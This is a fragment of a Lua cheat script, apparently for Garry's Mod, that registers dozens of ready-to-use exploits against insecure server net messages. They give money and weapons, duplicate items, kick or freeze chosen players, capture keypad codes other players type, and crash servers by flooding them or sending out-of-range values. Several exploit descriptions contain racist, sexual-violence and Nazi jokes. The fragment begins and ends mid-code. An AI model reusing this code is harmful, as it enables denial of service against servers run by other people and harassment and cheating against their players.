        {
            typ = "func",
            Name = "Change Name",
        }
    },
})

KV.AddExploit("Name Changer", {
    desc = "Allows you to change your name and playermodel to anything",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("UpdateCharSF", "take_my_cash") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "take_my_cash")
            net.WriteString(-10000)
            net.SendToServer()
            KV.NetStart(sploit, "UpdateCharSF")
            net.WriteString(tostring(KV.GetStored("nc8")))
            net.WriteString(tostring(KV.GetStored("nc8a")))
            net.WriteString(tostring(KV.GetStored("nc8b")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "First Name:",
            default = "GET",
            addr = "nc8"
        },
        {
            typ = "string",
            Name = "Last Name:",
            default = "ODIUM.PRO",
            addr = "nc8a"
        },
        {
            typ = "string",
            Name = "Player Model:",
            default = "models/error.mdl",
            addr = "nc8b"
        },
        {
            typ = "func",
            Name = "Change Name",
        }
    },
})

KV.AddExploit("Speed Hack", {
    desc = "Allows you to move at warp speed",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("SprintSpeedset") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "SprintSpeedset")
            net.WriteFloat(KV.SafeToNumber(KV.GetStored("sh1")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Speed: ",
            min = 0,
            max = math.huge,
            default = 1000,
            addr = "sh1"
        },
        {
            typ = "func",
            Name = "Go",
        }
    },
})

KV.AddExploit("Bonus Exploit", {
    desc = "Free Shit",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("AbilityUse") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "AbilityUse")
            net.WriteInt(tbl[1], 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Money",
            args = {1},
        },
        {
            typ = "func",
            Name = "Time Bonus",
            args = {2},
        },
        {
            typ = "func",
            Name = "HP",
            args = {3},
        },
        {
            typ = "func",
            Name = "Armor",
            args = {4},
        },
        {
            typ = "func",
            Name = "Salary Bonus",
            args = {5},
        },
        {
            typ = "func",
            Name = "Random Weapon",
            args = {6},
        },
        {
            typ = "func",
            Name = "Jailbreak",
            args = {7},
        },
    },
})

KV.AddExploit("Zombie Mode", {
    desc = "Raise an army of unkillable zombies",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("RevivePlayer") end,
    OnEnable = function(var, sploit)
        for k, v in ipairs(KV.GetStored("immortal_plyz", {})) do
            if IsValid(v) then
                if v:IsPlayer() then
                    KV.NetStart(sploit, "RevivePlayer")
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end
    end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            local cmd = varargs[1]

            if cmd:GetMouseX() == 0 and cmd:GetMouseY() == 0 and KV.LastAngles then
                cmd:SetViewAngles(KV.LastAngles)
            else
                KV.LastAngles = cmd:GetViewAngles()
            end
        end,
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)
            local t = KV.GetStored("immortal_plyz", {})

            if table.HasValue(t, ent) then
                if ent:IsPlayer() then
                    KV.NetStart(sploit, "RevivePlayer")
                    net.WriteEntity(ent)
                    net.SendToServer()
                end
            end
        end,
        player_spawn = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Player(data.userid)
            local t = KV.GetStored("immortal_plyz", {})

            if table.HasValue(t, ent) then
                if ent:IsPlayer() then
                    KV.NetStart(sploit, "RevivePlayer")
                    net.WriteEntity(ent)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "immortal_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Zombie Mode", {
    desc = "Become immortal",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("revival_revive_accept") end,
    hooks = {
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)

            if ent:IsPlayer() and ent == KV.GetLP() then
                KV.NetStart(sploit, "revival_revive_accept")
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Zombie Mode", {
    desc = "Infect players with the T-Virus",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("MakeZombie") end,
    hooks = {
        Think = function(tbl, sploit, varargs)
            for k, v in pairs(KV.GetStored("zomb_plyz", {})) do
                if not IsValid(v) then continue end
                KV.NetStart(sploit, "MakeZombie")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "zomb_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Zombie Mode", {
    desc = "Recover from any injury",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("UseMedkit") end,
    hooks = {
        Think = function(tbl, sploit, varargs)
            for k, v in pairs(KV.GetStored("zomb2_plyz", {})) do
                if not IsValid(v) then continue end
                KV.NetStart(sploit, "UseMedkit")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "zomb2_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Zombie Mode", {
    desc = "Become immortal",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("079ServerAction") end,
    hooks = {
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)

            if ent:IsPlayer() and ent == KV.GetLP() then
                sploit.vars.pos = ent:GetPos()
            end
        end,
        player_spawn = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Player(data.userid)

            if ent:IsPlayer() and ent == KV.GetLP() and sploit.vars.pos ~= Vector(0, 0, 0) then
                KV.NetStart(sploit, "079ServerAction")
                net.WriteString("Move")
                net.WriteVector(sploit.vars.pos)
                net.SendToServer()
                sploit.vars.pos = Vector(0, 0, 0)
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Dupe Weapons", {
    desc = "Hold any gun and press button to dupe",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("ItemStoreSyncItem", "RevivePlayer") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.RCC(sploit, "kill")
            KV.RCC(sploit, "darkrp", "invholster")
            KV.NetStart(sploit, "RevivePlayer", true)
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Dupe"
        },
    },
})

KV.AddExploit("Dupe Weapons", {
    desc = "Disassemble your weapons then nurse them back to health",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("ItemStoreSplit") or KV.ValidNetString("_ItemStoreSplit") or istable(itemstore) end,
    hooks = {
        Think = function(tbl, sploit)
            if KV.ValidNetString("ItemStoreSplit") or KV.ValidNetString("_ItemStoreSplit") then
                KV.NetStart(sploit, {"ItemStoreSplit", "_ItemStoreSplit"})

                net.WriteUInt(KV.GetLP().InventoryID, 32)
                net.WriteUInt(tonumber(KV.GetStored("dupe_index", 1)), 32)
                net.WriteUInt(0, 32)
                net.SendToServer()
            else
                KV.RCC("itemstore_split", KV.GetLP().InventoryID, tonumber(KV.GetStored("dupe_index", 1)), 0)
            end
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Index",
            default = 1,
            min = 0,
            max = math.huge,
            addr = "dupe_index"
        },
        {
            typ = "func",
            Name = "Dupe"
        },
    },
})

KV.AddExploit("Freeze Players", {
    desc = "Freeze selected players next time they respawn",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("NLR.ActionPlayer") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("freeze_plyz", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        KV.NetStart(sploit, "NLR.ActionPlayer")
                        net.WriteEntity(v)
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "freeze_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("plyWarning") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("kick_plyz", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        KV.NetStart(sploit, "plyWarning")
                        net.WriteEntity(v)
                        net.WriteString('You have to select a player before doing a action.')
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "kick_plyz"
        },
        {
            typ = "func",
            Name = "Kick"
        },
    },
})

KV.AddExploit("Kick Exploit", {
    desc = "Kick selected players",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("NLRKick") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("kick2_plyz", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        KV.NetStart(sploit, "NLRKick")
                        net.WriteEntity(v)
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "kick2_plyz"
        },
        {
            typ = "func",
            Name = "Kick"
        },
    },
})

KV.AddExploit("Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("RecKickAFKer") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("kick3_plyz", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        KV.NetStart(sploit, "RecKickAFKer")
                        net.WriteEntity(v)
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "kick3_plyz"
        },
        {
            typ = "func",
            Name = "Kick"
        },
    },
})

KV.AddExploit("Kick Exploit", {
    desc = "Kick all players",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("simfphys_turnsignal") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "simfphys_turnsignal")
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("send") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("kick4_plyz", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        KV.NetStart(sploit, "send")

                        net.WriteTable({1})

                        net.WriteTable({1})

                        net.WriteEntity(v)
                        net.WriteString("GET KV-MENU")
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "kick4_plyz"
        },
        {
            typ = "func",
            Name = "Kick"
        },
    },
})

KV.AddExploit("Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return KV.ValidNetString("sendteslaeffect") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("kick5_plyz", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        KV.NetStart(sploit, "sendteslaeffect")
                        net.WriteEntity(v)
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "kick5_plyz"
        },
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Respawn Exploit", {
    desc = "Respawn yourself",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.DynamicNetString("DarkRP_", "_ForceSpawn") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, sploit.channel)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Respawn",
            args = {},
        },
    },
})

KV.AddExploit("Respawn Exploit", {
    desc = "Respawn yourself",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("NLR_SPAWN") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "NLR_SPAWN")
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Respawn",
            args = {},
        },
    },
})

KV.AddExploit("Steal Police Guns", {
    desc = "WE WUZ KANGZ ND SHIET!",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("ARMORY_RetrieveWeapon") end,
    hooks = {
        Think = function(tbl, sploit)
            local r_tbl = KV.RecursiveGetVar(sploit, {"vars", "Think"}, "table", true)

            if r_tbl.cooldown == 0 then
                r_tbl.cooldown = KV.REAL_CURTIME + 300
            end

            KV.NetStart(sploit, "ARMORY_RetrieveWeapon")
            net.WriteString("weapon" .. tbl[1])
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Get " .. (ARMORY_WEAPON_Weapon1Name or "M16"),
            args = {1},
        },
        {
            typ = "func",
            Name = "Get " .. (ARMORY_WEAPON_Weapon2Name or "Shotgun"),
            args = {2},
        },
        {
            typ = "func",
            Name = "Get " .. (ARMORY_WEAPON_Weapon3Name or "Sniper"),
            args = {3},
        },
    },
})

KV.AddExploit("Build/Kill", {
    desc = "Back in my day, we didn't need 'safe spaces'",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("BuilderXToggleKill") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("buildkill_plyz", {})) do
                if not IsValid(v) then continue end

                if tbl[1] == 1 then
                    KV.NetStart(sploit, "BuilderXToggleBuild")
                    net.WriteEntity(v)
                    net.SendToServer()
                elseif tbl[1] == 2 then
                    KV.NetStart(sploit, "BuilderXToggleKill")
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "buildkill_plyz"
        },
        {
            typ = "func",
            Name = "Toggle Build",
            args = {1},
        },
        {
            typ = "func",
            Name = "Toggle Kill",
            args = {2},
        }
    },
})

KV.AddExploit("Keypad Hacker", {
    desc = "Roleplay as a Hacker by exploding all nearby keypads",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return KV.ValidNetString("start_wd_emp") and wd_Config ~= nil end,
    hooks = {
        Think = function(tbl, sploit)
            local r_tbl = KV.RecursiveGetVar(sploit, {"vars", "Think"}, "table", true)

            if r_tbl.cooldown == 0 then
                r_tbl.cooldown = KV.REAL_CURTIME + (wd_Config.EmpCooldown or 100)
            end

            KV.NetStart(sploit, "start_wd_emp")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Hack",
        },
    },
})

KV.AddExploit("Ja, Mein Führer", {
    desc = "Submit candidacy for the Führer election",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("1942_Fuhrer_SubmitCandidacy") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "1942_Fuhrer_SubmitCandidacy")
            net.WriteString(KV.GetLP():Nick())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Submit",
        },
    },
})

KV.AddExploit("Keypad Hacker", {
    desc = "Inspector gadget these fools",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.DynamicNetString("keypad") end,
    hooks = {
        PostRender = function(tbl, sploit)
            local e = KV.GetLP():GetEyeTrace().Entity

            if IsValid(e) and e.GetStatus then
                local text
                local color

                if KV.KeypadCodes[e] and KV.KeypadCodes[e] ~= "" then
                    text = KV.KeypadCodes[e]
                    color = Color(105, 255, 105, 150)
                elseif KV.TempKeypadCodes[e] and KV.TempKeypadCodes[e] ~= "" then
                    text = KV.TempKeypadCodes[e]
                    color = Color(250, 150, 150, 150)
                else
                    text = "Unknown"
                    color = Color(150, 150, 150, 150)
                end

                surface.SetDrawColor(Color(0, 0, 50, 150))
                surface.SetMaterial(grad)
                surface.DrawTexturedRect(ScrW() / 2 + 57, ScrH() / 2 - 7, 50, 15)
                KV.DrawText(text, "KVMenuText", ScrW() / 2 + 60, ScrH() / 2, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
            end

            for k, v in ipairs(KV.ents.FindByGlobal("GetStatus")) do
                if v.GetNumStars and not v.GetText then
                    v.GetText = function() return string.rep('*', v:GetNumStars()) end
                end

                if not v.GetSecure then
                    v.GetSecure = function() return true end
                end

                if IsValid(v) then
                    if v ~= e and KV.GetLP():GetPos():Distance(v:GetPos()) < 8000 then
                        local pos = v:GetPos():ToScreen()

                        if pos.x > 0 and pos.x < ScrW() and pos.y > 0 and pos.y < ScrH() then
                            if KV.KeypadCodes[v] and KV.KeypadCodes[v] ~= "" then
                                surface.SetDrawColor(Color(0, 0, 50, 150))
                                surface.SetMaterial(grad)
                                surface.DrawTexturedRect(pos.x, pos.y, 50, 15)
                                KV.DrawText(KV.KeypadCodes[v], "KVMenuText", pos.x + 5, pos.y + 6, Color(105, 255, 105, 150), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                            else
                                if KV.TempKeypadCodes[v] and KV.TempKeypadCodes[v] ~= "" then
                                    surface.SetDrawColor(Color(0, 0, 50, 150))
                                    surface.SetMaterial(grad)
                                    surface.DrawTexturedRect(pos.x, pos.y, 50, 15)
                                    KV.DrawText(KV.TempKeypadCodes[v], "KVMenuText", pos.x + 5, pos.y + 6, Color(250, 150, 150, 150), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                                else
                                    surface.SetDrawColor(Color(0, 0, 50, 150))
                                    surface.SetMaterial(grad)
                                    surface.DrawTexturedRect(pos.x, pos.y, 50, 15)
                                    KV.DrawText("Unknown", "KVMenuText", pos.x + 5, pos.y + 6, Color(150, 150, 150, 150), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                                end
                            end
                        end
                    end
                end
            end
        end,
        Tick = function(tbl, sploit)
            for k, v in ipairs(player.GetAll()) do
                local kp = v:GetEyeTrace().Entity

                if IsValid(kp) and IsValid(v) and kp.GetStatus and v:EyePos():Distance(kp:GetPos()) <= 120 then
                    KV.TempKeypadCodes[kp] = KV.TempKeypadCodes[kp] or ""
                    KV.KeypadText[kp] = KV.KeypadText[kp] or ""
                    KV.KeypadStatus[kp] = KV.KeypadStatus[kp] or 0

                    if isfunction(kp.GetText) and isfunction(kp.GetStatus) and (kp:GetText() ~= KV.KeypadText[kp] or kp:GetStatus() ~= KV.KeypadStatus[kp]) then
                        KV.KeypadText[kp] = kp:GetText()
                        KV.KeypadStatus[kp] = kp:GetStatus()

                        if KV.KeypadText[kp] and not kp:GetSecure() then
                            KV.TempKeypadCodes[kp] = KV.KeypadText[kp]

                            if KV.KeypadStatus[kp] == KV.GetKeypadStatus(kp)[2] and KV.TempKeypadCodes[kp] and KV.TempKeypadCodes[kp] ~= "" then
                                KV.KeypadCodes[kp] = KV.TempKeypadCodes[kp]

                                if not system.HasFocus() then
                                    system.FlashWindow()
                                end
                            end
                        else
                            local i = KV.KPGetHoveredElement(v, kp)

                            if i then
                                i = i.text
                            end

                            if KV.KeypadText[kp] then
                                if kp:GetStatus() == KV.GetKeypadStatus(kp)[2] and KV.TempKeypadCodes[kp] and KV.TempKeypadCodes[kp] ~= "" then
                                    KV.KeypadCodes[kp] = KV.TempKeypadCodes[kp]

                                    if not system.HasFocus() then
                                        system.FlashWindow()
                                    end
                                end
                            end

                            if KV.KeypadText[kp] == "" or kp:GetStatus() == KV.GetKeypadStatus(kp)[3] then
                                KV.TempKeypadCodes[kp] = ""
                            end

                            if KV.SafeToNumber(i) and (KV.SafeToNumber(i) > 0 and KV.SafeToNumber(i) < 10) and kp:GetText():len() ~= 0 then
                                KV.TempKeypadCodes[kp] = KV.TempKeypadCodes[kp] .. KV.SafeToNumber(i)
                            end
                        end
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Guaranteed server crash",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    prevalidated = true,
    scan = function() return (KV.ValidNetString("textstickers_entdata") or KV.ValidNetString("texstickers_entdata")) and TexStickers end,
    hooks = {
        Think = function(tbl, sploit)
            if KV.ValidNetString("textstickers_entdata") then
                KV.NetStart(sploit, "textstickers_entdata")
            else
                KV.NetStart(sploit, "texstickers_entdata")
            end

            net.WriteUInt(0xFFFFFFFF, 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Dunks the server in one",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("fly_over_end") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "fly_over_end")
            net.WriteString(tostring(math.pow(2, 64)) .. " " .. tostring(math.pow(2, 64)) .. " " .. tostring(math.pow(2, 64)))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Crash Jackson",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Instantly 1 tap the server",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("SimplicityAC_aysent") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "SimplicityAC_aysent")
            net.WriteUInt(1, 8)
            net.WriteUInt(0xFFFFFFFF, 32)
            net.WriteTable({})
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Crash it",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Whoops, did I accidentally leave this in here?",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("rHit.Confirm.Placement") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, 'rHit.Confirm.Placement')
            net.WriteInt(0xFFFFFFFF, 32)
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if strName == "rHit.Send.Message" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Brutal server rape",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("thiefnpc") or KV.ValidNetString("cst_badnpc") end,
    hooks = {
        Think = function(tbl, sploit)
            if KV.ValidNetString("thiefnpc") then
                KV.NetStart(sploit, "thiefnpc")
            elseif KV.ValidNetString("cst_badnpc") then
                KV.NetStart(sploit, "cst_badnpc")
            else
                return
            end

            net.WriteDouble(KV.GetLP():EntIndex())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "memset(SERVER, nullptr, size(SERVER) + 1)",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("nSetExpression") end,
    hooks = {
        Think = function(tbl, sploit)
            if not sploit.var or sploit.var == 3 then
                sploit.var = 1
            else
                sploit.var = sploit.var + 1
            end

            KV.NetStart(sploit, "nSetExpression")
            net.WriteFloat(sploit.var)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "*flex*",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    msgs_per_tick = 2,
    prevalidated = true,
    scan = function() return KV.ValidNetString("TowTruck_CreateTowTruck", "TOWTRUCK_RemoveTowTruck") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "TowTruck_CreateTowTruck")
            net.SendToServer()
            KV.NetStart(sploit, "TOWTRUCK_RemoveTowTruck")
            net.SendToServer()
        end,
        usermessage = {
            IncomingMessage = function(sploit, varargs)
                if varargs[1] == "_Notify" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = tostring(KV.GetLP()) .. " hit SERVER in head for 100 damage",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("StaminaDrowning") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "StaminaDrowning")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "game.GetWorld():Activate()",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return KV.ValidNetString("CRAFTINGMOD_INVENTORY") end,
    initial = function(sploit)
        local vars = sploit.vars or KV.RecursiveGetVar(sploit, {"vars"}, "table", true)

        if not vars.NAME then
            local ItemsList = KV.RecursiveGetVar(CRAFTINGMOD, {"ITEMS", "GetItemsList"}, "function")

            if ItemsList then
                for k, v in pairs(ItemsList(CRAFTINGMOD.ITEMS)) do
                    if not v.LoadData then
                        vars.NAME = v.NAME
                        break
                    end
                end
            end
        end
    end,
    hooks = {
        Think = function(tbl, sploit)
            local vars = sploit.vars or KV.RecursiveGetVar(sploit, {"vars"}, "table", true)

            KV.NetStart(sploit, "CRAFTINGMOD_INVENTORY")

            net.WriteTable({
                type = 6,
                ENTITY = "worldspawn",
                SKIN = 0,
                MODEL = "models/error.mdl",
                NAME = vars.NAME or "Beer"
            })

            net.WriteInt(0, 16)

            net.WriteString(tostring(KV.RecursiveGetVar(CRAFTINGMOD, {"PANELS", "Inventory_ID"}, "string") or 0))

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
            Name = "Give me shit",
        },
    },
})

--WUMAAccessStream has a ReadData related lag exploit
KV.AddExploit("Server Crasher", {
    desc = "Crashes any server",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("npctool_relman_up") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "npctool_relman_up")
            net.WriteUInt(-1, 12)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Overflow the server bathtub",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("CreateBadgeSpray") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "CreateBadgeSpray")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Shred the server",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("CallP") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "CallP")
            net.WriteEntity(KV.GetLP())
            net.WriteBit(true)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Burst the servers ear drums",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return usermessage.GetTable()["sounds_yo"] ~= nil or KV.ValidNetString("sounds_yo") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.RCC(sploit, "sounds_request")
        end,
        net = {
            Receive = function(sploit, strName)
                if strName == "sounds_yo" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Open the floodgates",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("dialogAlterWeapons") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "dialogAlterWeapons", true)
            net.WriteString("Add")

            net.WriteTable({
                [1] = "worldspawn"
            })

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Server Crasher", {
    desc = "Burn the books",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("hcLog") end,
    hooks = {
        Think = function(tbl, sploit)
